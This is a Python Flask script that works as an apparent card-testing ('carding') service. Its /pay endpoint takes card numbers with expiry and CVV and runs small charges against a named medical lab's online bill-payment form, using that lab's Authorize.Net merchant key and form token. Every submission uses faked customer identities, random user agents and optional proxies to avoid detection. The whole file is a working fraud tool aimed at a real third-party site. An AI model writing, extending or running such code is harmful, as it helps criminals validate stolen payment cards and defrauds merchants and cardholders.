import re
import json
import uuid
from flask import Flask, request, jsonify
import requests
from faker import Faker
from fake_useragent import UserAgent

app = Flask(__name__)
fake = Faker()
ua = UserAgent()

MERCHANT_NAME = "3c5Q9QdJW"
CLIENT_KEY = "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"

def clean_html_message(html_str):
    if not html_str:
        return ""

    # Remove HTML tags
    text = re.sub(r'<.*?>', '', html_str)
    text = text.replace("\\n", " ").replace("\n", " ").strip()

    # Remove annoying prefixes that ruin readability
    for phrase in [
        "Form error message",
        "Payment was declined by Authorize.Net.",
        "API: (2)",
        "This transaction has been declined.",
        "Form has not been submitted, please see the errors below."
    ]:
        text = text.replace(phrase, "")

    # Clean extra spaces leftover
    text = re.sub(r'\s+', ' ', text).strip()

    # If empty after cleaning, fallback to original text stripped
    if not text:
        text = html_str.strip()

    return text

def format_proxy(proxy_str):
    if proxy_str:
        return {
            "http": f"http://{proxy_str}",
            "https": f"http://{proxy_str}"
        }
    return None

def get_opaque_data(card_number: str, exp_month: str, exp_year: str, card_cvv: str, proxy_dict):
    url = "https://api2.authorize.net/xml/v1/request.api"
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/",
        "User-Agent": ua.random
    }
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": MERCHANT_NAME,
                "clientKey": CLIENT_KEY
            },
            "data": {
                "type": "TOKEN",
                "id": str(uuid.uuid4()),
                "token": {
                    "cardNumber": card_number,
                    "expirationDate": f"{exp_month}{exp_year}",
                    "cardCode": card_cvv
                }
            }
        }
    }

    r = requests.post(url, headers=headers, json=payload, proxies=proxy_dict, timeout=30)
    data = json.loads(r.content.decode('utf-8-sig'))
    if data.get("messages", {}).get("resultCode") == "Ok":
        return data["opaqueData"]["dataValue"]
    else:
        raise Exception(f"Failed to get opaqueData: {data}")

def submit_payment(opaque_value: str, month: str, year: str, amount: str, proxy_dict):
    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "origin": "https://avanticmedicallab.com",
        "referer": "https://avanticmedicallab.com/pay-bill-online/",
        "user-agent": ua.random,
        "x-requested-with": "XMLHttpRequest"
    }

    first_name = fake.first_name()
    last_name = fake.last_name()
    email = fake.email()
    phone = f"({fake.random_int(200, 999)}) {fake.random_int(200, 999)}-{fake.random_int(1000, 9999)}"
    city = fake.city()
    state = "NY"
    postal = fake.postcode()
    address = fake.street_address()

    form_data = {
        "wpforms[fields][1][first]": first_name,
        "wpforms[fields][1][last]": last_name,
        "wpforms[fields][17]": amount,
        "wpforms[fields][2]": email,
        "wpforms[fields][3]": phone,
        "wpforms[fields][14]": "Test Data",
        "wpforms[fields][4][address1]": address,
        "wpforms[fields][4][city]": city,
        "wpforms[fields][4][state]": state,
        "wpforms[fields][4][postal]": postal,
        "wpforms[fields][6]": f"$ {amount}",
        "wpforms[fields][11][]": "By clicking on Pay Now button you have read and agreed.",
        "wpforms[id]": "4449",
        "wpforms[author]": "1",
        "wpforms[post_id]": "3388",
        "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
        "wpforms[authorize_net][opaque_data][value]": opaque_value,
        "wpforms[authorize_net][card_data][expire]": f"{month}/{year}",
        "wpforms[token]": "1bc9aacc38fe976790deb45fe856da53",
        "action": "wpforms_submit",
        "page_url": "https://avanticmedicallab.com/pay-bill-online/",
        "page_title": "Pay Bill Online",
        "page_id": "3388"
    }

    r = requests.post(url, headers=headers, files={k: (None, v) for k, v in form_data.items()}, proxies=proxy_dict, timeout=30)
    return r.text

@app.route('/pay', methods=['GET'])
def pay():
    cc = request.args.get("cc")
    if not cc:
        return jsonify({"success": False, "error": "Missing required parameter: cc"}), 400

    proxy_str = request.args.get("proxy")
    amount = request.args.get("amount", "0.10")

    try:
        card_number, exp_month, exp_year, card_cvv = cc.split("|")
    except Exception:
        return jsonify({"success": False, "error": "Invalid cc format. Use: cardnumber|mm|yy|cvv"}), 400

    proxies = None
    if proxy_str:
        proxies = {
            "http": f"http://{proxy_str}",
            "https": f"http://{proxy_str}"
        }

    try:
        opaque = get_opaque_data(card_number, exp_month, exp_year, card_cvv, proxies)
        response_text = submit_payment(opaque, exp_month, exp_year, amount, proxies)

        try:
            response_json = json.loads(response_text)
        except Exception:
            return jsonify({
                "success": False,
                "charged_amount": f"${amount}",
                "message": "Failed to decode response",
                "raw_response": response_text
            })

        if response_json.get("success") == True:
            msg_html = response_json.get("data", {}).get("confirmation", "")
            message = clean_html_message(msg_html)
            success = True
        else:
            err_html = response_json.get("data", {}).get("errors", {}).get("general", {}).get("footer", "")
            message = clean_html_message(err_html)
            success = False

        return jsonify({
            "success": success,
            "charged_amount": f"${amount}",
            "message": message
        })

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
